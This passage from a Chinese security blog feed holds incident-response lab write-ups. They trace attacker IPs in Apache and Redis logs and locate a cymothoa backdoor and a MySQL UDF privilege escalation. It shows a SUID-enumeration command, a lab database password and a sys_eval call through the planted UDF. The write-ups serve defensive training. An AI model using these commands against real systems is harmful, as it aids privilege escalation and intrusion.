&lt;/h3>&lt;p>黑客提权其实和我们是一样的，我们先找找常见的&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">find / -perm -u=s -type f 2&amp;gt;/dev/null
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现&lt;code>find&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{7fd5884f493f4aaf96abee286ee04120}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f4">f4
&lt;/h3>&lt;p>去&lt;code>/opt&lt;/code>发现了有东西，一直递进&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">root@xuanji:/opt/.cymothoa-1-beta# ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Makefile core cymothoa.h payloads.h syscalls.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bgrep cymothoa hexdump_to_cstring.pl personalization.h udp_server
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bgrep.c cymothoa.c payloads syscall_code.pl udp_server.c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>cymothoa&lt;/code>是后门工具&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{087c267368ece4fcf422ff733b51aed9}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f5">f5
&lt;/h3>&lt;p>这个题我都没看懂在讲什么东西，后面发现原来是&lt;code>1.py&lt;/code>，所以我们找python在哪里就好了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">python3 /tmp/.temp/libprocesshider/1.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls -l /usr/bin/python3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">which python3.4
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{/usr/bin/python3.4}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>玄机第二章</title><link>https://baozongwi.xyz/p/xuanji-chapter-2/</link><pubDate>Fri, 14 Mar 2025 12:52:06 +0000</pubDate><guid>https://baozongwi.xyz/p/xuanji-chapter-2/</guid><description>&lt;h2 id="第二章日志分析-apache日志分析">第二章日志分析-apache日志分析
&lt;/h2>&lt;p>直接把Apache的日志导出来&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">apache2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">access&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f1">f1
&lt;/h3>&lt;p>但是这个日志已经有好几千行代码了，但是可以看到日志结构和&lt;code>auth.log&lt;/code>，是不太一样的，IP在第一位，我们直接把IP导出来&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | awk &amp;#39;{print $1}&amp;#39; | sort | uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.200.2}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f2">f2
&lt;/h3>&lt;p>指纹就是UA头，我们已经知道了黑客IP所以直接写命令&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep -Ea &amp;#34;192.168.200.2&amp;#34;| sort | uniq -c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>知道是&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag{2d6330f380f44ac20f3a02eed0958f66}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f3">f3
&lt;/h3>&lt;p>计数已经计算不出来了，这里我们计算行数&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep -Ea &amp;#34;/index.php&amp;#34;| sort | wc -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>flag{27}&lt;/code>&lt;/p>
&lt;h3 id="f4">f4
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep -Ea &amp;#34;192.168.200.2&amp;#34;| wc -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>但是不对，后面发现给误差算了，所以正则增强一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep -Ea &amp;#34;192.168.200.2 - -&amp;#34;| wc -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>flag{6555}&lt;/code>&lt;/p>
&lt;h3 id="f5">f5
&lt;/h3>&lt;p>查看有多少IP访问，其实我这个问题没有看太懂，就是总共的访问次数？&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep -Ea &amp;#34;^[0-9]+.*+03/Aug/2023:[08|09]&amp;#34;|awk &amp;#39;{print $1}&amp;#39;| uniq -c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat access.log.1 | grep -Ea &amp;#34;^[0-9]+.*+03/Aug/2023:[08|09]&amp;#34;|awk &amp;#39;{print $1}&amp;#39;| uniq -c | wc -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>最后交的是IP数，奇怪的语文问题&lt;code>flag{5}&lt;/code>&lt;/p>
&lt;h2 id="第二章日志分析-mysql应急响应">第二章日志分析-mysql应急响应
&lt;/h2>&lt;h3 id="f1-1">f1
&lt;/h3>&lt;p>先把目录导出来，放D盾里面，有一个文件里面什么的都有，不管他，而&lt;code>sh.php&lt;/code>是一句话，所以直接交&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{ccfda79e-7aa1-4275-bc26-a6189eb9a20b}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f2-1">f2
&lt;/h3>&lt;p>反弹shell的IP，看看日志就好了，&lt;code>/var/log/apache2/access.log&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-135519.jpg"
width="1141"
height="617"
srcset="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-135519_hu_9afce7adbd4c6e20.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-135519_hu_37c421382740d8c3.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="184"
data-flex-basis="443px"
>&lt;/p>
&lt;p>发现了命令什么的，写入到了&lt;code>/tmp/1.sh&lt;/code>，并且发现他是使用的UDF提权，&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.100.13}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="f3-1">f3
&lt;/h2>&lt;p>UDF提权使用的文件是&lt;code>/usr/lib/mariadb/plugin/udf.so&lt;/code>，这里是吃老本了&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-135800.jpg"
width="927"
height="201"
srcset="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-135800_hu_836d1bed4b3edc86.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-135800_hu_2b3a3188b5f62caf.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="461"
data-flex-basis="1106px"
>&lt;/p>
&lt;p>发现不对，区别就是mysql&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">/usr/lib/mysql/plugin/udf.so
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag{b1818bde4e310f3d23f1005185b973e7}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f4-1">f4
&lt;/h3>&lt;p>获取到的权限直接执行命令就知道了，在&lt;code>common.php&lt;/code>中知道了密码&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$conn&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">mysqli_connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;root&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;334cc35b3c704593&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;cms&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;3306&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="nv">$conn&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;数据库连接失败&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">mysql -uroot -p334cc35b3c704593
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">select * from mysql.func;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">select sys_eval(&amp;#34;whoami&amp;#34;);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>flag{mysql}&lt;/code>&lt;/p>
&lt;h2 id="第二章日志分析-redis应急响应">第二章日志分析-redis应急响应
&lt;/h2>&lt;h3 id="f1f3">f1&amp;amp;&amp;amp;f3
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现是个低版本但是我们只要IP所以提取一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">oE&lt;/span> &lt;span class="s1">&amp;#39;[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+&amp;#39;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">nr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>有四个IP，再挨个看看这些IP行&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">Ea&lt;/span> &lt;span class="s2">&amp;#34;192.168.100.13&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">Ea&lt;/span> &lt;span class="s2">&amp;#34;192.168.100.20&amp;#34;&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cat&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nb">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">redis&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">log&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">grep&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">Ea&lt;/span> &lt;span class="s2">&amp;#34;192.168.31.55&amp;#34;&lt;/span>&lt;span class="o">|&lt;/span> &lt;span class="n">sort&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">uniq&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现这三个IP都有成功链接的标志&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.100.13}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">flag{192.168.100.20}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f2-2">f2
&lt;/h3>&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-142342.jpg"
width="1122"
height="481"
srcset="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-142342_hu_58fb7d4f15cc6591.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-142342_hu_46311b5b40d6263.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="233"
data-flex-basis="559px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">find / -name &amp;#34;exp.so&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>给他下载下来，直接打开就有flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>也可以看看定时任务&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">crontab -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>发现有在定时反弹shell&lt;/p>
&lt;h3 id="f4-2">f4
&lt;/h3>&lt;p>找用户名，可以看看ssh，发现用户名&lt;code>xj-test-user&lt;/code>，搜索&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-142836.jpg"
width="1531"
height="756"
srcset="https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-142836_hu_7cc91f9a53074645.jpg 480w, https://baozongwi.xyz/p/xuanji-chapter-2/QQ20250314-142836_hu_cadd3c3114225d13.jpg 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="202"
data-flex-basis="486px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{xj-test-user-wow-you-find-flag}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="f5-1">f5
&lt;/h3>&lt;p>查看篡改的命令，命令一般都在&lt;code>/usr/bin&lt;/code>，看看最近修改的命令&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
